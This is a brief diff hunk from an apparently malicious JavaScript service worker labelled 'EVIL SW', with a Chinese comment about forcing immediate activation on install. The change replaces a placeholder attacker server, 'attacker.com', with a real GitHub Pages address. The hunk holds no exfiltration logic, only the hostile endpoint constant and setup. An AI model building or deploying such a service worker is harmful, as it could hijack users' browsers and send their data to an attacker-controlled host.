@@ -9,7 +9,7 @@
     'use strict';
     
     const PREFIX = '🚨 [EVIL SW]';
-    const ATTACKER_SERVER = 'https://attacker.com';
+    const ATTACKER_SERVER = 'https://johnstonemees.github.io';
     
     // ============================================
     // 1. 安装事件 - 强制立即激活
